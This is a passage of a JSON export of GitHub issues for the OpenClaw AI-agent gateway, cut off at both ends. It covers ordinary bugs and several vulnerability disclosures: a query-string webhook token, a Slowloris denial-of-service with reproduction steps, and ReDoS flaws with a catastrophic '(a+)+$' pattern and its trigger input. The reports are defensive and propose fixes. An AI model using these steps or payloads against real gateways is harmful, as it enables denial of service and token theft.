      "body": "## Problem\n\nOutbound messages from OpenClaw's WhatsApp Web integration to a linked device are consistently stuck in a 'waiting for this message' state on the recipient device, even though:\n\n- **Inbound messages work perfectly** — Messages from the linked device to OpenClaw are received without issue\n- **Outbound delivery succeeds** — Gateway logs show 'Sent chunk 1/1' confirmations\n- **The session reconnects fine** — Fresh QR code scans establish new sessions successfully\n\nThis happens on both the linked phone device AND WhatsApp Web simultaneously, suggesting a server-side encryption issue rather than a client-side problem.\n\n## Steps to Reproduce\n\n1. Link OpenClaw's WhatsApp Web session via QR code to a phone device\n2. Send a message from OpenClaw to the linked device\n3. On the linked device, messages appear as 'waiting for this message' indefinitely\n\n## Expected Behavior\n\nMessages should decrypt and display normally on the linked device, just like inbound messages do.\n\n## Logs\n\nGateway logs show successful outbound transmission:\n```\nSent chunk 1/1 (1001ms)\nAuto-replied successfully\n```\n\nBut client shows persistent decryption failure.\n\n## Hypothesis\n\nOpenClaw's WhatsApp Web E2E encryption context may not properly align with WhatsApp's server expectations for outbound linked device messages. The inbound path works, suggesting the issue is specific to how outbound encryption keys are managed or rotated.\n\n## Environment\n\n- OpenClaw version: 2026.1.29\n- Node version: 22.22.0\n- OS: Linux 6.8.0-90-generic (x64)\n- Channel: WhatsApp Web (linked device mode)",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5028",
      "createdAt": "2026-01-30T23:31:45Z",
      "updatedAt": "2026-02-11T04:12:41Z",
      "author": "tenumars",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3826488293,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5028#issuecomment-3826488293",
          "createdAt": "2026-01-30T23:44:32Z",
          "updatedAt": "2026-01-30T23:44:32Z",
          "author": "tenumars",
          "body": "The inbound messages from the agent say \"Waiting for this message. This may take a while\" and link to this support document. \nhttps://faq.whatsapp.com/3398056720476987?lang=en"
        },
        {
          "id": 3882020641,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5028#issuecomment-3882020641",
          "createdAt": "2026-02-11T04:12:40Z",
          "updatedAt": "2026-02-11T04:12:40Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5062,
      "title": "TypeError: Cannot read properties of undefined (reading 'includes') in Ollama model discovery",
      "body": "## Bug\n\nSporadic `Cannot read properties of undefined (reading 'includes')` error appearing in gateway.log.\n\n## Reproduction\n\nOccurs intermittently during Ollama model discovery. Error logged without stack trace:\n\n```\n2026-01-31T00:41:21.760Z Cannot read properties of undefined (reading 'includes')\n```\n\n## Location\n\n`dist/agents/models-config.providers.js` line 81:\n\n```javascript\nconst isReasoning = modelId.toLowerCase().includes(\"r1\") || modelId.toLowerCase().includes(\"reasoning\");\n```\n\n`modelId` is derived from `model.name` which can apparently be undefined in some edge cases.\n\n## Suggested Fix\n\nAdd a guard before accessing `.toLowerCase()`:\n\n```javascript\nconst modelId = model.name ?? '';\nconst isReasoning = modelId.toLowerCase().includes(\"r1\") || modelId.toLowerCase().includes(\"reasoning\");\n```\n\n## Environment\n\n- Clawdbot version: 2026.1.24-3\n- OS: macOS arm64\n- Ollama models: dolphin, qwen, deepseek-r1:7b, mistral",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5062",
      "createdAt": "2026-01-31T01:08:50Z",
      "updatedAt": "2026-02-11T04:12:39Z",
      "author": "Rickyzz",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882020582,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5062#issuecomment-3882020582",
          "createdAt": "2026-02-11T04:12:38Z",
          "updatedAt": "2026-02-11T04:12:38Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5099,
      "title": "macOS app crashes when opening Voice settings (MicLevelMonitor audio format mismatch)",
      "body": "## Summary\nThe macOS app crashes immediately when clicking the Voice tab in settings. The crash occurs in `MicLevelMonitor.start()` when trying to install an audio tap on the input node.\n\n## Crash Details\n```\nAVAudioIONodeImpl::SetOutputFormat(unsigned long, AVAudioFormat*)\nAUGraphNodeBaseV3::CreateRecordingTap(...)\nAVAudioEngineImpl::InstallTapOnNode(...)\n-[AVAudioNode installTapOnBus:bufferSize:format:block:]\nMicLevelMonitor.start(onLevel:)\nVoiceWakeSettings.restartMeter()\n```\n\n## Environment\n- macOS 15.3\n- OpenClaw 2026.1.29 (8345)\n- Mac Studio (Mac15,14)\n- Audio setup: Multiple USB audio interfaces, Aggregate Device as default input\n\n## Root Cause\nThe app appears to request a specific audio format for the tap that doesn't match the system's input format. With complex audio setups (aggregate devices, high sample rates like 768kHz from BlackHole), this causes `SetOutputFormat` to throw.\n\n## Suggested Fix\nInstead of specifying a format when calling `installTapOnBus`, query the input node's native format:\n```swift\nlet format = inputNode.outputFormat(forBus: 0)\ninputNode.installTap(onBus: 0, bufferSize: 1024, format: format) { ... }\n```\n\nOr handle the exception gracefully and disable the mic level meter if it fails, rather than crashing the entire app.\n\n## Workaround Attempted\n- Changed default input to Blue Yeti (48kHz) - still crashes\n- Granted Microphone/Speech Recognition permissions manually - still crashes\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5099",
      "createdAt": "2026-01-31T02:11:42Z",
      "updatedAt": "2026-02-11T04:12:36Z",
      "author": "CrossGen-ai",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3882020467,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5099#issuecomment-3882020467",
          "createdAt": "2026-02-11T04:12:36Z",
          "updatedAt": "2026-02-11T04:12:36Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5103,
      "title": "ClawdBot → OpenClaw migration leaves system in broken state (dual services, port conflicts, token mismatch)",
      "body": "## Summary\n\nAfter upgrading from ClawdBot to OpenClaw, the system was left in a broken state with dual services running, authentication failures, and the dashboard inaccessible. The upgrade process did not properly migrate or remove the old ClawdBot installation, causing conflicts.\n\n## Environment\n\n- **OS:** Linux 6.17.0-8-generic (Ubuntu)\n- **Node:** v22.22.0\n- **Old Package:** `clawdbot` v2026.1.24-3\n- **New Package:** `openclaw` v2026.1.29\n\n## Issues Encountered\n\n### 1. Dual Services Running Simultaneously\n\nBoth services were running at the same time after upgrade:\n\n```\nclawdbot-gateway.service   loaded active running  Clawdbot Gateway (v2026.1.24-3)\nopenclaw-gateway.service   loaded active running  OpenClaw Gateway (v2026.1.29)\n```\n\n### 2. Port Conflict and Restart Loop\n\nThe old gateway process held port 18789 while the new service entered a restart loop (53+ times):\n\n```\nGateway failed to start: another gateway instance is already listening on ws://127.0.0.1:18789\n```\n\n### 3. Authentication Token Mismatch (HTTP 401)\n\nEach service had a different gateway token, causing clients to get 401 errors.\n\n### 4. Both NPM Packages Remained Installed\n\n```\n/home/tyler/.npm-global/lib/node_modules/clawdbot\n/home/tyler/.npm-global/lib/node_modules/openclaw\n```\n\n## Root Cause\n\nThe upgrade from ClawdBot to OpenClaw:\n1. Did NOT stop the old clawdbot-gateway service\n2. Did NOT disable or remove the old systemd service file\n3. Did NOT uninstall the old clawdbot npm package\n4. Generated a new gateway token without migrating clients\n\n## Resolution Required\n\nA fresh install was required. Manual cleanup needed:\n\n```bash\nsystemctl --user stop clawdbot-gateway.service\npkill -f clawdbot\nnpm uninstall -g clawdbot\nrm -f ~/.config/systemd/user/clawdbot-gateway.service\nsystemctl --user daemon-reload\nopenclaw uninstall --all --yes\ncurl -fsSL https://openclaw.bot/install.sh | bash\n```\n\n## Suggestions\n\n1. **Upgrade path should handle ClawdBot migration** - stop/disable old service, uninstall old package, migrate token\n2. **Pre-flight check before starting service** - detect port conflicts, other claw services running\n3. **`openclaw uninstall` should detect old ClawdBot** - offer to remove old service files and package\n4. **Token migration or warning** - either migrate old token or clearly warn users\n5. **Documentation** - add a ClawdBot → OpenClaw migration guide\n\n---\n\n*Full detailed report available. Happy to provide more info.*",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5103",
      "createdAt": "2026-01-31T02:25:12Z",
      "updatedAt": "2026-02-11T04:12:34Z",
      "author": "tylervovan",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3831815702,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5103#issuecomment-3831815702",
          "createdAt": "2026-02-01T19:29:57Z",
          "updatedAt": "2026-02-01T19:29:57Z",
          "author": "chenyuan99",
          "body": "you can try use a skill to do it, the way I do is setup the openclaw as new and use the migration skill reset up everything, I think we can consider add the skill to openclaw as a default skill https://www.clawhub.ai/chenyuan99/openclaw-migration"
        },
        {
          "id": 3882020397,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5103#issuecomment-3882020397",
          "createdAt": "2026-02-11T04:12:34Z",
          "updatedAt": "2026-02-11T04:12:34Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5120,
      "title": "[Bug]: Webhook authentication token accepted via query parameters",
      "body": "\n## Summary\n\n**Severity:** P0/Critical (Score: 105/150)\n**CWE:** [CWE-598](https://cwe.mitre.org/data/definitions/598.html) - Use of GET Request Method With Sensitive Query Strings\n**OWASP:** [A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) - Identification and Authentication Failures\n**File:** `src/gateway/hooks.ts:49-64`\n\nThe webhook endpoint accepts authentication tokens via URL query parameters (`?token=xxx`), causing **credential leakage through multiple channels**. URLs are logged by web servers, cached by browsers, stored in HTTP Referer headers, and recorded by proxies/CDNs. This violates OWASP guidelines that sensitive data must never appear in URLs.\n\n**Why this is critical:** Even though the token is \"deprecated with a warning,\" it still works—meaning attackers can craft URLs that leak tokens when clicked. Anyone with access to server logs, proxy logs, browser history, or analytics data can harvest valid authentication tokens. Unlike password theft requiring active interception, token-in-URL leakage happens passively through normal infrastructure logging.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Public webhook endpoint (any internet user) | 40/40 |\n| **Impact** | Authentication bypass (stolen tokens) | 35/50 |\n| **Exploitability** | Single crafted URL | 30/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 0/30 |\n| **Total** | — | **105/150** |\n\n## Steps to reproduce\n1. Configure a webhook with a token\n2. Call the webhook with token in URL: `https://gateway/hooks/test?token=secret123`\n3. Check server access logs - token is visible in URL\n4. Token also appears in:\n   - Browser history (if accessed via browser for testing)\n   - HTTP Referer headers when following links from the response\n   - Proxy/CDN logs\n   - Browser extensions that inspect URLs\n\n## Expected behavior\nTokens in query parameters should be rejected entirely, not just deprecated with a warning.\n\n## Actual behavior\nQuery parameter tokens are accepted and processed:\n\n### Affected code location:\n\n**Hook Token Extraction** (`src/gateway/hooks.ts:49-63`):\n```typescript\nexport function extractHookToken(req: IncomingMessage, url: URL): HookTokenResult {\n  // ... header checks ...\n  const queryToken = url.searchParams.get(\"token\");\n  if (queryToken) return { token: queryToken.trim(), fromQuery: true };\n  return { token: undefined, fromQuery: false };\n}\n```\n\nA warning is logged, but the token is still accepted.\n\n## Environment\n- Clawdbot version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Logs or screenshots\nN/A - issue is architectural\n\n## Impact\n- **Credential leakage**: Tokens exposed in multiple logging/caching layers\n- **Token theft**: Attackers with access to logs can steal tokens\n- **Compliance violation**: OWASP guideline violation (sensitive data in URLs)\n- **Audit trail pollution**: Tokens in logs make rotation difficult\n\n## Recommended fix\n1. Remove query parameter token support entirely (not just deprecate)\n2. Return 400 error when token is provided in query string:\n```typescript\nif (queryToken) {\n  return { ok: false, error: 'Token in query parameter not allowed. Use Authorization header.' };\n}\n```\n3. Update documentation to require header-based authentication\n4. Add migration guide for users still using query parameter tokens",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5120",
      "createdAt": "2026-01-31T02:51:30Z",
      "updatedAt": "2026-02-11T04:12:31Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830629746,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5120#issuecomment-3830629746",
          "createdAt": "2026-02-01T08:43:21Z",
          "updatedAt": "2026-02-01T08:43:21Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 8.2 / 10.0 |\n| **Severity** | High |\n| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)\n"
        },
        {
          "id": 3882020263,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5120#issuecomment-3882020263",
          "createdAt": "2026-02-11T04:12:30Z",
          "updatedAt": "2026-02-11T04:12:30Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5122,
      "title": "[Bug]: readJsonBody() has no read timeout, enabling Slowloris DoS",
      "body": "\n## Summary\n\n**Severity:** P0/Critical (Score: 100/150)\n**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html) - Uncontrolled Resource Consumption\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/gateway/hooks.ts:66-106`\n\nThe `readJsonBody()` function reads HTTP request bodies without a time limit, making the webhook endpoint vulnerable to **Slowloris denial-of-service attacks**. While a size limit (256KB default) prevents memory exhaustion from large payloads, an attacker can bypass this by sending data extremely slowly—1 byte per minute keeps the connection alive indefinitely while never hitting the size limit.\n\n**Why this is critical:** Slowloris attacks are devastatingly effective because they consume server resources (socket connections, memory for buffers, worker threads) with minimal attacker bandwidth. A single attacker with a slow internet connection can exhaust all available server connections, making the service unavailable to legitimate users. Unlike bandwidth-based DDoS attacks, Slowloris requires no botnet—just patience.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Public webhook endpoint (any internet user) | 40/40 |\n| **Impact** | Denial of Service (connection exhaustion) | 20/50 |\n| **Exploitability** | Single slow request per connection | 30/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 10/30 |\n| **Total** | — | **100/150** |\n\n## Steps to reproduce\n1. Open a connection to a webhook endpoint\n2. Send HTTP headers with `Content-Length: 1000`\n3. Send 1 byte every 60 seconds\n4. Connection stays open, consuming resources\n5. Repeat with many connections to exhaust server capacity\n\n## Expected behavior\nBody reading should timeout after a reasonable duration (e.g., 30 seconds), returning an error.\n\n## Actual behavior\nNo time limit on body reading:\n\n### Affected code location:\n\n**Hook Body Reader** (`src/gateway/hooks.ts:66-106`):\n```typescript\nexport async function readJsonBody(\n  req: IncomingMessage,\n  maxBytes: number,\n): Promise<{ ok: true; value: unknown } | { ok: false; error: string }> {\n  return await new Promise((resolve) => {\n    let done = false;\n    let total = 0;\n    const chunks: Buffer[] = [];\n    req.on(\"data\", (chunk: Buffer) => {\n      // Size limit checked - good\n      if (total > maxBytes) { /* ... */ }\n      chunks.push(chunk);\n    });\n    req.on(\"end\", () => { /* ... */ });\n    req.on(\"error\", (err) => { /* ... */ });\n    // <-- No timeout! Slow client hangs forever\n  });\n}\n```\n\n## Environment\n- Clawdbot version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Logs or screenshots\nN/A - manifests as resource exhaustion\n\n## Impact\n- **Connection exhaustion**: Each slow request holds a socket\n- **Memory consumption**: Buffers held for slow requests\n- **DoS vulnerability**: Gateway hooks are externally accessible\n- **Low attack cost**: Attacker needs minimal bandwidth\n\n## Recommended fix\nAdd read timeout:\n```typescript\nexport async function readJsonBody(\n  req: IncomingMessage,\n  maxBytes: number,\n  timeoutMs = 30000,\n): Promise<{ ok: true; value: unknown } | { ok: false; error: string }> {\n  return await new Promise((resolve) => {\n    const timeout = setTimeout(() => {\n      if (!done) {\n        done = true;\n        req.destroy();\n        resolve({ ok: false, error: 'Request body read timeout' });\n      }\n    }, timeoutMs);\n\n    // ... existing handlers ...\n\n    req.on(\"end\", () => {\n      clearTimeout(timeout);\n      // ... existing logic ...\n    });\n  });\n}\n```",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5122",
      "createdAt": "2026-01-31T02:53:54Z",
      "updatedAt": "2026-02-11T04:12:29Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830629816,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5122#issuecomment-3830629816",
          "createdAt": "2026-02-01T08:43:25Z",
          "updatedAt": "2026-02-01T08:43:25Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 7.5 / 10.0 |\n| **Severity** | High |\n| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3882020199,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5122#issuecomment-3882020199",
          "createdAt": "2026-02-11T04:12:29Z",
          "updatedAt": "2026-02-11T04:12:29Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5123,
      "title": "[Bug]: ReDoS vulnerability in session filter regex allows denial of service",
      "body": "\n## Summary\n\n**Severity:** P0/Critical (Score: 100/150)\n**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html) - Inefficient Regular Expression Complexity\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/infra/exec-approval-forwarder.ts:70-77`\n\nThe session filter accepts arbitrary regex patterns from configuration and executes them without complexity validation, enabling **ReDoS (Regular Expression Denial of Service)** attacks. A pattern like `(a+)+$` matched against input `\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"` causes exponential backtracking—each additional 'a' doubles processing time, quickly reaching seconds, then minutes, then hours.\n\n**Why this is critical:** This is in the exec-approval system—security-critical infrastructure that gates command execution. A single malicious regex pattern freezes the entire Node.js event loop, blocking ALL requests (not just approval-related ones). Unlike network DoS requiring sustained traffic, ReDoS needs just one bad config value to completely disable the system. The pattern persists in config, meaning the DoS survives restarts.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Config-dependent (requires config write access) | 5/40 |\n| **Impact** | Denial of Service (complete system hang) | 20/50 |\n| **Exploitability** | Single malicious pattern | 30/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 30/30 |\n| **Category Modifier** | Smoking Gun (arbitrary regex execution) | +15 |\n| **Total** | — | **100/150** |\n\n## Steps to reproduce\n1. Configure `sessionFilter` with a malicious regex pattern like `[\"(a+)+$\"]`\n2. Trigger exec approval matching against a string like `\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"`\n3. Observe the Node.js process hanging due to exponential backtracking\n\n## Expected behavior\nSession filter patterns should be validated for complexity, or use literal string matching instead of arbitrary regex.\n\n## Actual behavioris that the \nThe regex is compiled and executed without any complexity checks or timeout protection, allowing catastrophic backtracking.\n\n### Affected code location:\n**File** (`src/infra/exec-approval-forwarder.ts:70-77`):\n```typescript\nfunction matchSessionFilter(sessionKey: string, patterns: string[]): boolean {\n  return patterns.some((pattern) => {\n    try {\n      return sessionKey.includes(pattern) || new RegExp(pattern).test(sessionKey);\n    } catch {\n      return sessionKey.includes(pattern);\n    }\n  });\n}\n```\n\n**Also affected** (`src/discord/monitor/exec-approvals.ts:221-227`):\nSimilar pattern matching logic with same vulnerability.\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Logs or screenshots\nN/A - issue is in code logic\n\n## Impact\n- **Denial of Service**: A single malicious regex pattern can hang the entire gateway\n- **Security**: The exec-approvals system is security-critical infrastructure\n- **Scope**: Configuration may be accessible to semi-trusted parties\n\n## Recommended fix\n1. Validate regex complexity before compilation (reject patterns with nested quantifiers like `(a+)+`)\n2. Use a regex safety library like `safe-regex` to detect dangerous patterns\n3. Consider using literal string matching for session filters instead of arbitrary regex\n4. Alternatively, wrap regex matching with a timeout",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5123",
      "createdAt": "2026-01-31T02:56:50Z",
      "updatedAt": "2026-02-11T04:12:27Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3830629892,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5123#issuecomment-3830629892",
          "createdAt": "2026-02-01T08:43:28Z",
          "updatedAt": "2026-02-01T08:43:28Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 4.4 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3832534211,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5123#issuecomment-3832534211",
          "createdAt": "2026-02-02T02:00:41Z",
          "updatedAt": "2026-02-02T02:00:41Z",
          "author": "coygeek",
          "body": "Closing as duplicate - `src/infra/exec-approval-forwarder.ts` ReDoS is explicitly covered in #6027 (ReDoS via User-Controllable Regular Expression Patterns)."
        },
        {
          "id": 3832670105,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5123#issuecomment-3832670105",
          "createdAt": "2026-02-02T03:07:29Z",
          "updatedAt": "2026-02-02T03:07:29Z",
          "author": "coygeek",
          "body": "Reopening - this is the original filing. Later duplicates will be closed instead."
        },
        {
          "id": 3882020119,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5123#issuecomment-3882020119",
          "createdAt": "2026-02-11T04:12:27Z",
          "updatedAt": "2026-02-11T04:12:27Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5124,
      "title": "[Bug]: ReDoS vulnerability in log redaction patterns affects all logging",
      "body": "\n## Summary\n\n**Severity:** P0/Critical (Score: 100/150)\n**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html) - Inefficient Regular Expression Complexity\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/logging/redact.ts:48-60`\n\nThe `logging.redactPatterns` configuration accepts arbitrary regex patterns that are applied to **every single log message** system-wide. A malicious pattern causes catastrophic backtracking on routine log output, creating a system-wide performance degradation or complete hang that affects all functionality—not just logging.\n\n**Why this is critical:** Unlike the session filter ReDoS (issue 031), this pattern runs on EVERY log line. Normal application operation generates dozens of log messages per second. A pattern like `/(a+)+$/` matched against common log text containing sequences of similar characters can slow each log call from microseconds to seconds. The multiplication effect (bad pattern × high log volume) makes this particularly devastating. Worse: the slowdown masks its own symptoms since logging the error is itself slow.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Config-dependent (requires config write access) | 5/40 |\n| **Impact** | Denial of Service (system-wide slowdown) | 20/50 |\n| **Exploitability** | Single malicious pattern | 30/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 30/30 |\n| **Category Modifier** | Smoking Gun (arbitrary regex on all logs) | +15 |\n| **Total** | — | **100/150** |\n\n## Steps to reproduce\n1. Configure `logging.redactPatterns` with a pattern like `[\"/(a+)+$/\"]`\n2. Trigger any logging with text matching the vulnerable pattern\n3. Observe severe slowdown or hang on log operations\n\n## Expected behavior\nRedaction patterns should be validated for complexity before use, or have execution timeouts.\n\n## Actual behavior\nArbitrary regex patterns from config are compiled and executed against every log message without any safety checks.\n\n### Affected code location:\n**File** (`src/logging/redact.ts:48-60`):\n```typescript\nfunction parsePattern(raw: string): RegExp | null {\n  if (!raw.trim()) return null;\n  const match = raw.match(/^\\/(.+)\\/([gimsuy]*)$/);\n  try {\n    if (match) {\n      const flags = match[2].includes(\"g\") ? match[2] : `${match[2]}g`;\n      return new RegExp(match[1], flags);\n    }\n    return new RegExp(raw, \"gi\");\n  } catch {\n    return null;\n  }\n}\n```\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Logs or screenshots\nN/A - issue is in code logic\n\n## Impact\n- **System-wide**: Redaction is applied to every single log message\n- **Observability**: Slowed logging can mask ongoing attacks\n- **Availability**: Severe patterns can effectively DoS the entire system\n\n## Recommended fix\n1. Validate regex patterns using `safe-regex` before acceptance\n2. Consider pre-defined redaction patterns instead of arbitrary regex\n3. Add execution timeout for pattern matching\n4. Log a warning and skip patterns that fail safety validation",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5124",
      "createdAt": "2026-01-31T02:58:08Z",
      "updatedAt": "2026-02-11T04:12:26Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830629961,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5124#issuecomment-3830629961",
          "createdAt": "2026-02-01T08:43:31Z",
          "updatedAt": "2026-02-01T08:43:31Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 4.4 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3832534118,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5124#issuecomment-3832534118",
          "createdAt": "2026-02-02T02:00:38Z",
          "updatedAt": "2026-02-02T02:00:38Z",
          "author": "coygeek",
          "body": "Closing as duplicate - `src/logging/redact.ts` ReDoS is explicitly covered in #6027 (ReDoS via User-Controllable Regular Expression Patterns)."
        },
        {
          "id": 3832670135,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5124#issuecomment-3832670135",
          "createdAt": "2026-02-02T03:07:30Z",
          "updatedAt": "2026-02-02T03:07:30Z",
          "author": "coygeek",
          "body": "Reopening - this is the original filing. Later duplicates will be closed instead."
        },
        {
          "id": 3882020062,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5124#issuecomment-3882020062",
          "createdAt": "2026-02-11T04:12:25Z",
          "updatedAt": "2026-02-11T04:12:25Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5127,
      "title": "[Bug]:",
